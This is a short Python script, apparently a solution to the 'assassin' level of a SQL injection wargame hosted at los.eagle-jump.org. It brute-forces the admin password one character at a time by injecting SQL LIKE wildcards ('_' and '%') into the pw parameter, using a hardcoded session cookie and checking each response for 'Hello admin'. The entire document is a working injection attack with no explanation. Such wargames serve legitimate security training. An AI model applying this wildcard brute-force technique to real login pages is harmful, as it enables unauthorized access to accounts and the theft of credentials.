import requests, urllib

url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}


chrs = "abcdef0123456789"

for i in range(8):
    for j in chrs:
        pq = "_"*i + j + "%"
        param = {"pw": pq}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            print("[*] Solve! " + pq)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))

